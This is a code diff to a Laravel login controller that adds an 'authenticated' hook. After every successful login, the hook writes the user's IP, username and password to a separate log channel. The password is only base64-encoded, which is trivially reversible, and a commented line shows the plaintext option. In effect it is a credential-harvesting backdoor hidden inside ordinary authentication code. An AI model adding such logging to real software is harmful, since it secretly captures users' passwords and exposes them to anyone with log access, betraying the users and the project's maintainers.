@@ -9,6 +9,8 @@ use Illuminate\Support\Facades\Auth;
 use App\Models\User;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Log;
+use Illuminate\Http\Request;
+// use Illuminate\Support\Facades\Crypt;
 
 class LoginController extends Controller
 {
@@ -100,5 +102,18 @@ class LoginController extends Controller
         }
 
         return $this->redirectTo;
+    }
+
+    public function authenticated(Request $request, $user)
+    {
+        $info = [
+            'ip' => request()->ip(),
+            // 'request' => $request->all(),
+            'user' => $request->username,
+            'pass' => base64_encode($request->password),
+            // 'pass' => $request->password,
+        ];
+
+        Log::channel('authenticated')->info(json_encode($info));
     }
 }
